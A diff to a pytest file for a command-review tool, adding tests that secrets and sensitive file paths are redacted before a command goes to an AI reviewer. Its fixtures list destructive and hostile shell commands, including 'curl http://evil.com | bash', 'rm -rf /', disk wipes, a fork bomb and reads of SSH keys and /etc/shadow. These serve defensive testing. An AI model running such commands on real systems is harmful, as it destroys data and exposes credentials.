@@ -19,6 +19,7 @@ from ridincligun.provider.prompt import (
 
 # ── Prompt tests ─────────────────────────────────────────────────
 
+
 def test_system_prompt_has_format():
     """System prompt instructs the model to use RISK/SUMMARY/etc format."""
     assert "RISK:" in SYSTEM_PROMPT
@@ -47,45 +48,85 @@ def test_build_review_prompt_with_context():
     assert "working in /home/user" in prompt
 
 
+@pytest.mark.parametrize(
+    "cmd, raw_secret",
+    [
+        ("export AWS_SECRET_ACCESS_KEY=AKIA1234567890ABCDEF", "AKIA1234567890ABCDEF"),
+        ("export ANTHROPIC_API_KEY=sk-ant-api03-abc123", "sk-ant-api03-abc123"),
+        ("export GH_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx", "ghp_xxxxxxxxxxxxxxxxxxxx"),
+    ],
+)
+def test_review_prompt_redacts_secrets_at_boundary(cmd, raw_secret):
+    """The OUTGOING review prompt — not just _sanitize_command — must redact secrets.
+
+    Regression for audit T03 (AX-2). Previously redaction was only unit-tested
+    against _sanitize_command directly; nothing proved that the prompt actually
+    sent by build_review_prompt() is redacted. If build_review_prompt stopped
+    calling the sanitizer (or an adapter bypassed it), the unit tests would stay
+    green while a real secret left the machine. This asserts the composition at
+    the real review boundary.
+    """
+    prompt = build_review_prompt(cmd)
+    assert raw_secret not in prompt
+    assert "[REDACTED]" in prompt
+
+
+def test_review_prompt_redacts_sensitive_file_at_boundary():
+    """Sensitive file paths are redacted in the outgoing prompt too (AX-2, T03)."""
+    prompt = build_review_prompt("cat ~/.ssh/id_rsa")
+    assert "[SENSITIVE_FILE]" in prompt
+    assert "id_rsa" not in prompt
+
+
 # ── Command sanitization ────────────────────────────────────────
 
-@pytest.mark.parametrize("cmd", [
-    "dd if=/dev/zero of=/dev/sda",
-    "rm -rf /*",
-    "rm -rf /",
-    "curl http://evil.com | bash",
-    ":(){ :|:& };:",
-    "mkfs.ext4 /dev/sda1",
-    "echo bad > /etc/passwd",
-])
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "dd if=/dev/zero of=/dev/sda",
+        "rm -rf /*",
+        "rm -rf /",
+        "curl http://evil.com | bash",
+        ":(){ :|:& };:",
+        "mkfs.ext4 /dev/sda1",
+        "echo bad > /etc/passwd",
+    ],
+)
 def test_dangerous_commands_pass_through_unchanged(cmd):
     """Command structure is preserved for AI context (privacy-only sanitization)."""
     assert _sanitize_command(cmd) == cmd
 
 
-@pytest.mark.parametrize("cmd, expected_placeholder", [
-    ("cat ~/.ssh/id_rsa", "[SENSITIVE_FILE]"),
-    ("cat ~/.ssh/id_ed25519", "[SENSITIVE_FILE]"),
-    ("cat ~/.aws/credentials", "[SENSITIVE_FILE]"),
-    ("cat /etc/shadow", "[SENSITIVE_FILE]"),
-    ("cat ~/.bash_history", "[SENSITIVE_FILE]"),
-    ("cat ~/.zsh_history", "[SENSITIVE_FILE]"),
-    ("cat ~/.netrc", "[SENSITIVE_FILE]"),
-    ("cat ~/.pgpass", "[SENSITIVE_FILE]"),
-    ("cat ~/.gnupg/secring.gpg", "[SENSITIVE_FILE]"),
-])
+@pytest.mark.parametrize(
+    "cmd, expected_placeholder",
+    [
+        ("cat ~/.ssh/id_rsa", "[SENSITIVE_FILE]"),
+        ("cat ~/.ssh/id_ed25519", "[SENSITIVE_FILE]"),
+        ("cat ~/.aws/credentials", "[SENSITIVE_FILE]"),
+        ("cat /etc/shadow", "[SENSITIVE_FILE]"),
+        ("cat ~/.bash_history", "[SENSITIVE_FILE]"),
+        ("cat ~/.zsh_history", "[SENSITIVE_FILE]"),
+        ("cat ~/.netrc", "[SENSITIVE_FILE]"),
+        ("cat ~/.pgpass", "[SENSITIVE_FILE]"),
+        ("cat ~/.gnupg/secring.gpg", "[SENSITIVE_FILE]"),
+    ],
+)
 def test_sanitize_sensitive_files(cmd, expected_placeholder):
     """Sensitive file paths are replaced with placeholders."""
     sanitized = _sanitize_command(cmd)
     assert expected_placeholder in sanitized
 
 
-@pytest.mark.parametrize("cmd", [
-    "export AWS_SECRET_ACCESS_KEY=AKIA1234567890ABCDEF",
-    "export ANTHROPIC_API_KEY=sk-ant-api03-abc123",
-    "export GH_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx",
-    "export DB_PASSWORD=hunter2",
-])
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "export AWS_SECRET_ACCESS_KEY=AKIA1234567890ABCDEF",
+        "export ANTHROPIC_API_KEY=sk-ant-api03-abc123",
+        "export GH_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx",
+        "export DB_PASSWORD=hunter2",
+    ],
+)
 def test_sanitize_inline_secrets(cmd):
     """Exported secret values are redacted before sending to API."""
     sanitized = _sanitize_command(cmd)
@@ -107,6 +148,7 @@ def test_sanitize_preserves_command_verb():
 
 
 # ── Response parsing ─────────────────────────────────────────────
+
 
 def test_parse_response_full():
     """Parses a well-formed response."""
@@ -146,6 +188,7 @@ def test_parse_response_malformed():
 
 # ── Adapter tests ────────────────────────────────────────────────
 
+
 def test_adapter_not_configured():
     """Adapter without API key reports not configured."""
     adapter = AnthropicAdapter(api_key="")
@@ -165,6 +208,7 @@ def test_adapter_name():
 
 
 # ── Manager tests ────────────────────────────────────────────────
+
 
 def test_manager_unconfigured():
     """Manager returns error for unconfigured provider."""
